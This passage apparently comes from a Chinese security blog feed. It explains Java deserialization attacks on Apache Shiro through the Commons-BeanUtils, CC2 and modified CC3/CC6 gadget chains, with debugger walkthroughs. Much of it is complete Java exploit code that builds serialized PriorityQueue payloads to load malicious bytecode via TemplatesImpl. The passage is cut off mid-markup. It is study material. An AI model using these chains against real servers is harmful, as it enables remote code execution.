<span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>javaBean类设置有构造函数，私有属性和公共getter&#x2F;setter方法：JavaBean类通常会包含一些私有属性，而这些属性必须通过公共的getter和setter方法进行访问和修改。这是为了保证JavaBean类的封装性，同时也方便外部程序对JavaBean对象的属性进行操作。在commons-beanutils的java库中的PropertyUtils类能够动态调用getter&#x2F;setter方法，获取属性值。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.payload;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Beantest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Persion</span> <span class="variable">persion</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Persion</span>(<span class="string">&quot;xilitter&quot;</span>,<span class="number">19</span>);</span><br><span class="line">        System.out.println(PropertyUtils.getProperty(persion,<span class="string">&quot;name&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看运行结果也确实能够获取到name属性。</p><img src="/2023/03/27/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CB%E9%93%BE%E5%88%A9%E7%94%A8/1.png" class><h2 id="漏洞原理剖析"><a href="#漏洞原理剖析" class="headerlink" title="漏洞原理剖析"></a>漏洞原理剖析</h2><p>从上面的例子能够知道，PropertyUtils类的getProperty函数能够动态调用javaBean的getter&#x2F;setter方法，有点像动态代理的函数调用了。我们在此处下个断点跟进调试看一下。</p><img src="/2023/03/27/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CB%E9%93%BE%E5%88%A9%E7%94%A8/2.png" class><p>跟到getProperty函数里面。</p><img src="/2023/03/27/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CB%E9%93%BE%E5%88%A9%E7%94%A8/3.png" class><p>会调用到PropertyUtilsBean类的getProperty函数，继续跟进。</p><img src="/2023/03/27/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CB%E9%93%BE%E5%88%A9%E7%94%A8/4.png" class><p>这里有几个分支判断，检查对象是否是一个Map，索引等，这里直接进入到最下面的else里，跟进。</p><img src="/2023/03/27/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CB%E9%93%BE%E5%88%A9%E7%94%A8/6.png" class><p>跟进invokeMethod函数，</p><img src="/2023/03/27/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CB%E9%93%BE%E5%88%A9%E7%94%A8/7.png" class><p>if条件判断后调用了invoke函数，这里的method是getName函数，它会调用Persion类的此方法。</p><img src="/2023/03/27/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CB%E9%93%BE%E5%88%A9%E7%94%A8/8.png" class><p>而结果也正是如此。</p><img src="/2023/03/27/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CB%E9%93%BE%E5%88%A9%E7%94%A8/9.png" class><p>从上面的分析上看，我们可以调用任意函数的任意方法，但是仅限于调用javaBean格式的方法，也就是get和set打头的方法。而在CC3链的动态加载类那块，是有符合javaBean格式的方法的，在TemplatesImpl类的getOutputProperties函数，</p><img src="/2023/03/27/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CB%E9%93%BE%E5%88%A9%E7%94%A8/10.png" class><p>这函数里是调用了newTransformer方法的，而我们分析过CC3链就知道，它是动态加载恶意类的关键函数，这里可以利用PropertyUtils类的getProperty方法来获取TemplatesImpl类的OutputProperties属性从而调用这个getOutputProperties方法触发恶意类加载弹出计算器。编写程序：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> shiro.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Beantest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">//反射修改值</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://tmp/classes/Testdemo.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        PropertyUtils.getProperty(templates,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这代码大部分都是CC3的内容，在这不细讲了。学习shiro这一块肯定是要先了解CC的，CC链是基础。运行代码看此思路走不走的通。</p><img src="/2023/03/27/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CB%E9%93%BE%E5%88%A9%E7%94%A8/11.png" class><p>成功弹出计算器，没毛病。</p><h2 id="构造链子"><a href="#构造链子" class="headerlink" title="构造链子"></a>构造链子</h2><p>链子的后半段就用TemplatesImpl类的动态类加载了，然后就调用getProperty函数进而调用newTransformer触发了。查找用法，找找什么类的什么方法调用了getProperty方法。这里查找到BeanComparator类的compare方法，</p><img src="/2023/03/27/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CB%E9%93%BE%E5%88%A9%E7%94%A8/12.png" class><p>在CC2链中PriorityQueue类的siftUpUsingComparator方法调用了compare方法。</p><img src="/2023/03/27/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CB%E9%93%BE%E5%88%A9%E7%94%A8/13.png" class><p>comparator属性可控，可以调用任意类的compare方法，而PriorityQueue类也重写了readObject方法，可以作为入口类，（具体细节详见CC2链）那么整条链子就对接上了。大致链子流程为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PriorityQueue.readObject-&gt;siftUpUsingComparator-&gt;BeanComparator.compare-&gt;PropertyUtils.getProperty-&gt;TemplatesImpl.newTransformer-&gt;动态加载恶意类</span><br></pre></td></tr></table></figure><h2 id="问题分析与解决"><a href="#问题分析与解决" class="headerlink" title="问题分析与解决"></a>问题分析与解决</h2><p>事实上编写完初级版的EXP序列化都会出现报错的，放上初级EXP的关键代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Beantest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">//反射修改值</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://tmp/classes/Testdemo.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(beanComparator);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="string">&quot;2222&quot;</span>);</span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>看一下序列化的报错信息：</p><img src="/2023/03/27/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CB%E9%93%BE%E5%88%A9%E7%94%A8/14.png" class><p>只看这条报错信息还是有点懵的，在add函数下个断点调试看一下。</p><img src="/2023/03/27/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CB%E9%93%BE%E5%88%A9%E7%94%A8/15.png" class><p>第一个插入队列的是TemplatesImpl对象，没啥好跟的，看第二个add，</p><img src="/2023/03/27/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CB%E9%93%BE%E5%88%A9%E7%94%A8/16.png" class><p>这里队列个数不是0，调用siftUp函数，跟进。</p><img src="/2023/03/27/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CB%E9%93%BE%E5%88%A9%E7%94%A8/17.png" class><p>继续跟进这个函数里面，调用compare方法。</p><img src="/2023/03/27/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CB%E9%93%BE%E5%88%A9%E7%94%A8/18.png" class><p>这里是要调getOutputProperties函数的，之后不再细跟了，直接到抛出异常那里。</p><img src="/2023/03/27/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CB%E9%93%BE%E5%88%A9%E7%94%A8/19.png" class><p>这里调用2222的outputProperties属性发生异常。那么该怎么解决呢？引入CC依赖的TransformingComparator类，让PriorityQueue类的comparator属性赋值为它，不是默认shiro不带CC依赖的吗？这只是为了序列化不报错异常退出而已，后面再用反射改回来，实际上服务端执行的是序列化后的代码，而我们在序列化的时候就把comparator属性给改掉了，（反射的强大之处）为什么要引入TransformingComparator类，宏观上来看是为了不让第二个add发生报错。</p><img src="/2023/03/27/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CB%E9%93%BE%E5%88%A9%E7%94%A8/20.png" class><p>该函数也重写了compare方法，这里将value1和value2作比较，而这两个值都是能直接可控的，主要还是为了不报错罢了，不清楚的小伙伴自己下断点跟一下就明白了。</p><p>完整版EXP：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> shiro.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Beantest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://tmp/classes/Testdemo.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="string">&quot;2222&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;PriorityQueue&gt; cl = PriorityQueue.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparatorFiled</span> <span class="operator">=</span> cl.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparatorFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparatorFiled.set(priorityQueue,beanComparator);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;shiro.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        System.out.println(<span class="string">&quot;1.序列化成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本地起环境打一下，看看效果。</p><img src="/2023/03/27/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CB%E9%93%BE%E5%88%A9%E7%94%A8/21.png" class><p>弹出计算器，万岁。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>目前shiro专题就告一段落吧，shiro框架的其他版本后续再补，这次先放了。</p><p>反序列化之路任重而道远。</p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shiro反序列化-打CC依赖</title>
      <link href="/2023/03/25/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93CC%E4%BE%9D%E8%B5%96/"/>
      <url>/2023/03/25/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93CC%E4%BE%9D%E8%B5%96/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>上文主要分析了shiro框架存在反序列化漏洞的原理，并且用URLDNS链成功探测出此漏洞。那么如果此框架中添加了CC依赖，我们就可以拿CC链来打了。事实上在ysoserial里，只有CC2能打，因为shiro框架大多都添加Commons Collections4这个大版本。本文就主要分析针对于Commons Collections3和4两个版本shiro反序列化中CC链的利用。</p><h2 id="打Commons-Collections4-0"><a href="#打Commons-Collections4-0" class="headerlink" title="打Commons Collections4.0"></a>打Commons Collections4.0</h2><p>简单说下CC2链，执行类和CC3是一样的，利用TemplatesImpl类动态加载字节码，而CC2的反序列化入口类为PriorityQueue，看一下它的readObject函数：</p><img src="/2023/03/25/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93CC%E4%BE%9D%E8%B5%96/1.png" class><p>队列元素也被序列化了，最后调用heapify函数，</p><img src="/2023/03/25/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93CC%E4%BE%9D%E8%B5%96/2.png" class><p>继续跟进</p><img src="/2023/03/25/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93CC%E4%BE%9D%E8%B5%96/3.png" class><p>comparator属性在构造器中被赋值，可控。继续跟进</p><img src="/2023/03/25/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93CC%E4%BE%9D%E8%B5%96/4.png" class><p>最终调用可控任意类的compare方法，将comparator赋值为transformingComparator类，跟进。</p><img src="/2023/03/25/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93CC%E4%BE%9D%E8%B5%96/5.png" class><p>调用了任意类的transform方法，这个方法很熟悉了，让transformer赋值为invokerTransformer对象来调用它的transform方法，在transform方法通过反射调用TemplatesImpl类的newTransformer方法来对恶意字节码进行类加载和初始化。至此，整条链就对接上了。由于这条链没有单独拿出来说，所以在这就简单说一下思路。CC2链的完整exp：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">//反射修改值</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://tmp/classes/Testdemo.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        InvokerTransformer invokerTransformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> transformingComparator.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformerField</span> <span class="operator">=</span> cl.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformerField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformerField.set(transformingComparator,invokerTransformer);</span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc2.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        System.out.println(<span class="string">&quot;1.序列化成功&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>pom.xml添加CC4版本依赖，用cc2链子来打一下。</p><img src="/2023/03/25/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93CC%E4%BE%9D%E8%B5%96/6.png" class><p>成功弹出计算器了。</p><h2 id="打Commons-Collections3-0"><a href="#打Commons-Collections3-0" class="headerlink" title="打Commons Collections3.0"></a>打Commons Collections3.0</h2><p>ysoserial里其他的CC链对于shiro框架的CommonsCollection3版本的依赖是打不通的，先拿CC6链尝试打一下，看看服务端报了什么错。</p><img src="/2023/03/25/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93CC%E4%BE%9D%E8%B5%96/7.png" class><p>Transformer加载不到，在CC6中Transformer是个数组。</p><img src="/2023/03/25/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93CC%E4%BE%9D%E8%B5%96/8.png" class><p>为什么数组类会加载不到呢？报错的地方在DefaultSerializer类的ClassResolvingObjectInputStream方法，我们跟进看一下。</p><img src="/2023/03/25/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93CC%E4%BE%9D%E8%B5%96/9.png" class><p>原生的反序列化函数的内部实现是调用ObjectInputStream对象的readObject函数，而在本代码用了ClassResolvingObjectInputStream函数，这个函数是shiro自定义的输入流函数，跟进该函数看一下：</p><img src="/2023/03/25/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93CC%E4%BE%9D%E8%B5%96/10.png" class><p>它重写了这个resolveClass函数，导致不能加载到数组类，具体原因是tomcat类加载的问题，与本篇文章内容关联不大，详细细节不再叙说。</p><p>既然数组类不能用，那么就用现成的CC链来拼接一条不用数组类的全新的链子。再打CC依赖的链子中，执行类有两种，第一种是Runtime命令执行，由于Runtime类未继承序列化接口，所以需要通过反射创建实例，而这种方式需要Transformer数组来迭代调用。所以只能用另一种方式，任意类加载。直接把CC3的后半段拿过来。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://tmp/classes/Testdemo.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates, codes);</span><br></pre></td></tr></table></figure><p>还是需要调用TemplatesImpl类的newTransformer方法，而这个方法可以通过InvokerTransformer来调用。那么到现在为止，需要找到一个点来调用InvokerTransformer的transform方法，利用LazyMap类。</p><img src="/2023/03/25/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%89%93CC%E4%BE%9D%E8%B5%96/11.png" class><p>而这一部分也不再说了，是CC6的前一段，那么直接拿过来就完事了。整条连就拼接上了，CC6的前半段加上CC2的中间一小段加上CC3的后半段，所以完整EXP为：</p><figure class="highlight 